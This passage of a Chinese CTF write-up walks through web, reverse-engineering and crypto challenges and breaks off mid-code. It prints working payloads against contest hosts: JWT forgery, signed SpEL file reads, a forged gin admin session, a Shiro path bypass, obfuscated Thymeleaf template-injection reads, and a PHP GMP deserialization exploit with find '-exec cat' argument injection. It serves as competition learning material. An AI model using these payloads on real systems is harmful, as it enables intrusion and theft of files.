<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIxIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ2OTA0Mn0.fONrD0R3NLTybq2WEP5V7uWTBI_0T0E5utI3MZFngMU&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>明显的 jwt，需要用这个来 auth，用 <code>https://github.com/brendan-rius/c-jwt-cracker</code> 爆破出来 secret 是 1，修改 userRole 到 ADMIN 就可以拿到客户端的地址 <a href="http://117.51.136.197/B5Itb8dFDaSFWZZo/client" target="_blank" rel="noopener">http://117.51.136.197/B5Itb8dFDaSFWZZo/client</a></p>
<p>逆向一下得到用签名算法用的是 hmac，key 是 DDCTFWithYou，fuzz 了半天发现是 spel，直接命令执行似乎不行，于是根据提示给的 flag 位置直接读 flag 即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"&#123;'a': T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/home/dc2-user/flag/flag.txt'))&#125;"</span></span><br><span class="line">ts = int(time.time())</span><br><span class="line"></span><br><span class="line">sign = base64.b64encode(hmac.new(<span class="string">b'DDCTFWithYou'</span>,msg=<span class="string">f"<span class="subst">&#123;cmd&#125;</span>|<span class="subst">&#123;ts&#125;</span>"</span>.encode(), digestmod=<span class="string">'sha256'</span>).digest())</span><br><span class="line"></span><br><span class="line"><span class="string">'''&#123;"signature":"65+KmCKrBVr6UAsjvSZ/iu1bdpx5xmIJLmAX2Squksk=","command":"'ls'","timestamp":1599189389&#125;'''</span></span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://117.51.136.197/server/command'</span>, json=&#123;</span><br><span class="line">    <span class="string">'signature'</span>: sign.decode(),</span><br><span class="line">    <span class="string">'command'</span>: cmd,</span><br><span class="line">    <span class="string">'timestamp'</span>: ts</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<h3 id="卡片商店"><a href="#卡片商店" class="headerlink" title="卡片商店"></a>卡片商店</h3><p>看到 session 就知道明显的是 gin，于是尝试整数溢出，借 9223372036854775807 个卡片就可以成功溢出，只需要还 1 张卡片，白嫖 9223372036854775806 张，兑换得到提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">恭喜你，买到了礼物，里面有夹心饼干、杜松子酒和一张小纸条，纸条上面写着：url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12，你能看懂它的含义吗？</span><br></pre></td></tr></table></figure>
<p>访问 flag 提示不是幸运玩家，但是有了 secretkey 就可以直接伪造 session，对 session base64 解码可以发现用的是 gob 序列化，明显看到 bool, admin 字样，直接自己也搭一个环境设置个 admin session 即可</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"github.com/gin-contrib/sessions"</span></span><br><span class="line">	<span class="string">"github.com/gin-contrib/sessions/cookie"</span></span><br><span class="line">	<span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">"Udc13VD5adM_c10nPxFu@v12"</span>))</span><br><span class="line">	r.Use(sessions.Sessions(<span class="string">"session"</span>, store))</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">"/hello"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		session := sessions.Default(c)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> session.Get(<span class="string">"hello"</span>) != <span class="string">"world"</span> &#123;</span><br><span class="line">			session.Set(<span class="string">"admin"</span>, <span class="literal">true</span>)</span><br><span class="line">			session.Save()</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">"hello"</span>: session.Get(<span class="string">"hello"</span>)&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">":8000"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Easy-Web"><a href="#Easy-Web" class="headerlink" title="Easy Web"></a>Easy Web</h3><p>deleteMe 很明显的 shiro，但是尝试了下反序列化，key 全部不对。于是尝试了下新的权限绕过，可以直接越权访问到 index</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;116.85.37.131&#x2F;34867ccfda85234382210155be32525c&#x2F;;&#x2F;web&#x2F;index</span><br></pre></td></tr></table></figure>

<p>明显有个 img 接口可以任意文件下载，通过 WEB-INF/web.xml 一直套娃下，可以下到一堆 class，但是没有找到有漏洞的接口，在 GitHub 上找了下类似的项目，fuzz 了一堆配置文件，最后找到 <code>WEB-INF/classes/spring-shiro.xml</code>.<br>里面有个 <code>WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class</code>，找到路由 <code>map.put(&quot;/68759c96217a32d5b368ad2965f625ef/**&quot;, &quot;authc,roles[admin]&quot;);</code>, 进去发现是个 thymeleaf 渲染，但是要绕之前的 com.ctf.util.SafeFilter.</p>
<p>绕了半天最后用 ProcessBuiler 弹 shell 发现连 ls 都没权限执行，于是只好回到 java 用相关 API 读文件，构造 payload 用 File 来列目录，发现 flag 就在 /flag_is_here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># /flag_is_here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">20</span>):</span><br><span class="line">    sess = requests.session()</span><br><span class="line">    content = <span class="string">'''</span></span><br><span class="line"><span class="string">    [[$&#123; T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101&#125;)).getConstructors()[1].newInstance(T(String).valueOf(new char[]&#123;47&#125;)).listFiles()[%d] &#125;]]</span></span><br><span class="line"><span class="string">    '''</span>% i</span><br><span class="line">    res = sess.post(<span class="string">"http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/customize"</span>, &#123;</span><br><span class="line">        <span class="string">'content'</span>: content</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">#[[$&#123; (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114&#125;)).getConstructors()[0].newInstance(T(String).valueOf(new char[]&#123;47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101&#125;)))).next() &#125;]]</span></span><br><span class="line"></span><br><span class="line">    uuid = res.text[res.text.find(<span class="string">'./render/'</span>)+len(<span class="string">'./render/'</span>):res.text.find(<span class="string">'./render/'</span>)+len(<span class="string">'./render/2b32ce0c2a9292af4fdfe3333058c02c'</span>)]</span><br><span class="line"></span><br><span class="line">    res = sess.get(<span class="string">f'http://116.85.37.131/34867ccfda85234382210155be32525c/;/web/68759c96217a32d5b368ad2965f625ef/render/<span class="subst">&#123;uuid&#125;</span>'</span>)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>

<p>最后用 Scanner 这个类，方法名里面没有 read， payload 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[[$&#123; (new java.util.Scanner(T(java.net.URLClassLoader).getSystemClassLoader().loadClass(T(String).valueOf(new char[]&#123;106, 97, 118, 97, 46, 105, 111, 46, 70, 105, 108, 101, 82, 101, 97, 100, 101, 114&#125;)).getConstructors()[0].newInstance(T(String).valueOf(new char[]&#123;47, 102, 108, 97, 103, 95, 105, 115, 95, 104, 101, 114, 101&#125;)))).next() &#125;]]</span><br></pre></td></tr></table></figure>

<h3 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h3><p>GMP 的一个 CVE，百度就能搜到, 可以覆盖任意对象的任意属性. <a href="https://bugs.php.net/bug.php?id=70513" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=70513</a>.<br>访问 <a href="http://117.51.137.166/hint/hint.php" target="_blank" rel="noopener">http://117.51.137.166/hint/hint.php</a> 拿到前半部分<br>然后覆盖 $mc 的 flag 导致参数注入就能读到后半部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$inj = <span class="string">"-exec cat &#123;&#125; ;"</span>;</span><br><span class="line">$inner = <span class="string">'s:1:"3";a:3:&#123;s:4:"flag";s:'</span>.strlen($inj).<span class="string">':"'</span>.$inj.<span class="string">'";s:2:"hi";s:2:"aa";i:0;O:12:"DateInterval":1:&#123;s:1:"y";R:2;&#125;&#125;'</span>;</span><br><span class="line">$exploit = <span class="string">'a:1:&#123;i:0;C:3:"GMP":'</span>.strlen($inner).<span class="string">':&#123;'</span>.$inner.<span class="string">'&#125;&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span> . $exploit . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$a = urlencode($exploit);</span><br><span class="line"></span><br><span class="line">system(<span class="string">"curl http://117.51.137.166/EOf9uk3nSsVFK1LQ.php?bullet=$a"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Android-Reverse-1"><a href="#Android-Reverse-1" class="headerlink" title="Android Reverse 1"></a>Android Reverse 1</h3><p>一个有点不太对劲的AES和tea系列加密算法加一个md5。<br>虽然aes不太对劲，但顺着aes加密函数，在他隔壁找到了aes的解密函数，直接把加密hook成解密就可以解密。<br>arm64的so里的tea解密部分好像被优化了，所以先把apk重打包，扔掉64位的so。<br>32位的so里的tea加密也是一个函数，有一个控制加密的参数8，hook掉把8改为-8，即可以解密。<br>然后md5部分没办法解，顺着给的提示先解tea，再解AES，就可以拿到Flag。</p>
<h3 id="Android-Reverse-2"><a href="#Android-Reverse-2" class="headerlink" title="Android Reverse 2"></a>Android Reverse 2</h3><p>先github找个脚本，恢复了Armariris的字符串，然后顺着找到动态注册的关键函数。</p>
<p>包名如第一题，猜测算法也基本同第一题，hook了一下发现aes没变，tea加密变化了，可能是密钥之类的变了，不过没事还是可以直接Hook改参数。<br>Frida-dexdump确认了一下，Java层啥都没有。</p>
<p>所以还是直接Hook加密改成解密就可以得到Flag。</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="真·签到题"><a href="#真·签到题" class="headerlink" title="真·签到题"></a>真·签到题</h3><p>公告板里面有</p>
<h3 id="一起拼图吗"><a href="#一起拼图吗" class="headerlink" title="一起拼图吗"></a>一起拼图吗</h3><p>ChaMD5 之前有类似的题目，github 上有解题脚本 <a href="https://github.com/virink/puzzle_tool" target="_blank" rel="noopener">https://github.com/virink/puzzle_tool</a>, 用模式 4 DiffRGB 就能直接拼回来</p>
<h3 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h3><p>一共 5 个轮密钥，其中很明显因为只是异或 + 位移的关系， k3, k4 可以合并成一个，实际上有效的是 4 个 0-4096 的密钥，但是空间还是很大，没办法爆破。<br>这里可以用 MITM，保存 4096 * 4096 个状态，将爆破空间降到 4096^3，用 cpp 写了下，速度还是挺快的，几分钟能跑完，<br>选取给的 plaintext 和 ciphertext 的第一个 bits 来爆破，然后用后面的 3 个来验证下是否正确</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//int sbox0[] = 太长不复制了</span></span><br><span class="line"><span class="comment">//int sbox1[] =</span></span><br><span class="line"><span class="comment">//int rsbox0[] =</span></span><br><span class="line"><span class="comment">//int rsbox1[] =</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> NUM_BITS = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">int</span> MAX_VALUE = (<span class="number">2</span> &lt;&lt; (NUM_BITS - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">int</span> BIT_MASK = MAX_VALUE - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rol7</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((((b) &lt;&lt; <span class="number">7</span>) &amp; BIT_MASK) | (((b) &amp; BIT_MASK) &gt;&gt; (NUM_BITS - <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ror7</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((((b) &amp; BIT_MASK) &gt;&gt; <span class="number">7</span>) | (((b) &lt;&lt; (NUM_BITS - <span class="number">7</span>)) &amp; BIT_MASK));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt_block</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> k3, <span class="keyword">int</span> k4)</span> </span>&#123;</span><br><span class="line">    i = sbox0[sbox1[sbox0[(i &amp; BIT_MASK) ^ k0] ^ k1] ^ k2] ^ k3;</span><br><span class="line">    <span class="keyword">return</span> (ror7(i) ^ k4) &amp; BIT_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt_block_simple</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> kf)</span> </span>&#123;</span><br><span class="line">    i = sbox0[sbox1[sbox0[(i &amp; BIT_MASK) ^ k0] ^ k1] ^ k2];</span><br><span class="line">    i = i ^ kf;</span><br><span class="line">    <span class="keyword">return</span> (ror7(i)) &amp; BIT_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decrypt_block</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> k3, <span class="keyword">int</span> k4)</span> </span>&#123;</span><br><span class="line">    i = rol7((i &amp; BIT_MASK) ^ k4) ^ k3;</span><br><span class="line">    <span class="keyword">return</span> (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decrypt_block_simple</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> kf)</span> </span>&#123;</span><br><span class="line">    i = rol7((i &amp; BIT_MASK)) ^ kf;</span><br><span class="line">    <span class="keyword">return</span> (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">merge_two</span><span class="params">(<span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n1 &lt;&lt; <span class="number">12</span>) | n2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; split_two(<span class="keyword">int</span> n) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::make_pair(n &gt;&gt; <span class="number">12</span>, n &amp; BIT_MASK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1092 -&gt; 2285</span></span><br><span class="line"><span class="comment">// k0, k1, k2, (k3 ^ k4) -&gt; kf</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; mid_status;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; keys;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        tmp.reserve(<span class="number">4096</span>);</span><br><span class="line">        mid_status[i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> plain = <span class="number">1079</span>;</span><br><span class="line">    <span class="keyword">int</span> cipher = <span class="number">567</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k0 = <span class="number">0</span>; k0 &lt; <span class="number">4096</span>; k0++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k1 = <span class="number">0</span>; k1 &lt; <span class="number">4096</span>; k1++) &#123;</span><br><span class="line">            <span class="keyword">int</span> merge = merge_two(k0, k1);</span><br><span class="line">            <span class="keyword">int</span> mid = sbox1[sbox0[plain ^ k0] ^ k1];</span><br><span class="line">            mid_status[mid].push_back(merge);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k2 = <span class="number">0</span>; k2 &lt; <span class="number">4096</span>; k2++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> kf = <span class="number">0</span>; kf &lt; <span class="number">4096</span>; kf++) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = rol7(cipher);</span><br><span class="line">            mid = mid ^ kf;</span><br><span class="line">            mid = rsbox0[mid];</span><br><span class="line">            mid = mid ^ k2;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> &amp;tgt : mid_status[mid]) &#123;</span><br><span class="line">                <span class="keyword">auto</span> splited = split_two(tgt);</span><br><span class="line">                <span class="keyword">int</span> k0 = splited.first;</span><br><span class="line">                <span class="keyword">int</span> k1 = splited.second;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (encrypt_block_simple(<span class="number">1079</span>, k0, k1, k2, kf) == <span class="number">567</span> &amp;&amp;</span><br><span class="line">                    encrypt_block_simple(<span class="number">633</span>, k0, k1, k2, kf) == <span class="number">361</span> &amp;&amp;</span><br><span class="line">                        encrypt_block_simple(<span class="number">1799</span>, k0, k1, k2, kf) == <span class="number">1793</span> &amp;&amp;</span><br><span class="line">                        encrypt_block_simple(<span class="number">1121</span>, k0, k1, k2, kf) == <span class="number">1001</span>) &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; k0 &lt;&lt; <span class="string">" "</span> &lt;&lt; k1 &lt;&lt; <span class="string">" "</span> &lt;&lt; k2 &lt;&lt; <span class="string">" "</span> &lt;&lt; kf &lt;&lt; <span class="string">" "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后得到两个结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3488 2863 726 1886</span><br><span class="line">934 1050 1509 3200</span><br></pre></td></tr></table></figure>

<p>改下脚本用合并的轮密钥来解密，第一行那四个就是正确的密钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Define constant properties</span></span><br><span class="line">SECRET_KEYS = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]  <span class="comment"># DUMMY</span></span><br><span class="line">NUM_BITS = <span class="number">12</span></span><br><span class="line">BLOCK_SIZE_BITS = <span class="number">48</span></span><br><span class="line">BLOCK_SIZE = BLOCK_SIZE_BITS / <span class="number">8</span></span><br><span class="line">MAX_VALUE = (<span class="number">2</span> &lt;&lt; (NUM_BITS - <span class="number">1</span>))</span><br><span class="line">BIT_MASK = MAX_VALUE - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cipher</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, k0, k1, k2, kf)</span>:</span></span><br><span class="line">        self.k0 = k0</span><br><span class="line">        self.k1 = k1</span><br><span class="line">        self.k2 = k2</span><br><span class="line">        self.kf = kf</span><br><span class="line"></span><br><span class="line">        self._rand_start = <span class="number">0</span></span><br><span class="line">        self.sbox0, self.rsbox0 = self.generate_boxes(<span class="number">106</span>)</span><br><span class="line">        self.sbox1, self.rsbox1 = self.generate_boxes(<span class="number">81</span>)</span><br><span class="line">        <span class="keyword">print</span> self.sbox0</span><br><span class="line">        <span class="keyword">print</span> self.sbox1</span><br><span class="line">        <span class="keyword">print</span> self.rsbox0</span><br><span class="line">        <span class="keyword">print</span> self.rsbox1</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_srand</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self._rand_start = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self._rand_start == <span class="number">0</span>:</span><br><span class="line">            self._rand_start = <span class="number">123459876</span></span><br><span class="line">        hi = self._rand_start / <span class="number">127773</span></span><br><span class="line">        lo = self._rand_start % <span class="number">127773</span></span><br><span class="line">        x = <span class="number">16807</span> * lo - <span class="number">2836</span> * hi</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            x += <span class="number">0x7fffffff</span></span><br><span class="line">        self._rand_start = (x % (<span class="number">0x7fffffff</span> + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> self._rand_start</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_boxes</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.my_srand(seed)</span><br><span class="line">        sbox = range(MAX_VALUE)</span><br><span class="line">        rsbox = range(MAX_VALUE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(MAX_VALUE):</span><br><span class="line">            r = self.my_rand() % MAX_VALUE</span><br><span class="line">            temp = sbox[i]</span><br><span class="line">            sbox[i] = sbox[r]</span><br><span class="line">            sbox[r] = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(MAX_VALUE):</span><br><span class="line">            rsbox[sbox[i]] = i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sbox, rsbox</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ror7</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((((b) &amp; BIT_MASK) &gt;&gt; <span class="number">7</span>) | (((b) &lt;&lt; (NUM_BITS - <span class="number">7</span>)) &amp; BIT_MASK))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rol7</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((((b) &lt;&lt; <span class="number">7</span>) &amp; BIT_MASK) | (((b) &amp; BIT_MASK) &gt;&gt; (NUM_BITS - <span class="number">7</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        num_blocks = len(s) / BLOCK_SIZE</span><br><span class="line">        num_remainder = len(s) % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">        pad = (BLOCK_SIZE - num_remainder) % BLOCK_SIZE</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(BLOCK_SIZE - num_remainder):</span><br><span class="line">            s += chr(pad)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unpad_string</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        pad = ord(s[<span class="number">-1</span>]) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> pad == <span class="number">0</span> <span class="keyword">or</span> pad &gt; BLOCK_SIZE:</span><br><span class="line">            pad = BLOCK_SIZE</span><br><span class="line">        <span class="keyword">return</span> s[:-pad]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">string_to_bits_list</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        input_chars = s</span><br><span class="line">        num_blocks = len(s) / BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">        bits_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(num_blocks):</span><br><span class="line">            block = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE):</span><br><span class="line">                block = block &lt;&lt; <span class="number">8</span></span><br><span class="line">                block = block | ord(input_chars[i * BLOCK_SIZE + j])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE_BITS, <span class="number">0</span>, -NUM_BITS):</span><br><span class="line">                bits_list.append((block &gt;&gt; (j - NUM_BITS)) &amp; BIT_MASK)</span><br><span class="line">        <span class="keyword">return</span> bits_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bits_list_to_string</span><span class="params">(self, input_bits)</span>:</span></span><br><span class="line">        num_input_bits_per_block = BLOCK_SIZE_BITS / NUM_BITS;</span><br><span class="line">        output_chars = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(input_bits), num_input_bits_per_block):</span><br><span class="line">            block = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(num_input_bits_per_block):</span><br><span class="line">                block = block &lt;&lt; NUM_BITS</span><br><span class="line">                block = block | (input_bits[i + j])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">                output_chars.append((block &gt;&gt; ((j - <span class="number">1</span>) * <span class="number">8</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> output_chars])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_bits</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        boxed = self.sbox0[self.sbox1[self.sbox0[(b &amp; BIT_MASK) ^ self.k0] ^ self.k1] ^ self.k2] ^ self.kf</span><br><span class="line">        <span class="keyword">return</span> (self.ror7(boxed)) &amp; BIT_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_bits</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        unboxed = self.rol7((b &amp; BIT_MASK)) ^ self.kf</span><br><span class="line">        <span class="keyword">return</span> (self.rsbox0[self.rsbox1[self.rsbox0[unboxed] ^ self.k2] ^ self.k1] ^ self.k0);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        pad_s = self.pad_string(s)</span><br><span class="line">        bits = self.string_to_bits_list(pad_s)</span><br><span class="line">        <span class="keyword">return</span> self.bits_list_to_string([(self.encrypt_bits(b)) <span class="keyword">for</span> b <span class="keyword">in</span> bits])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, 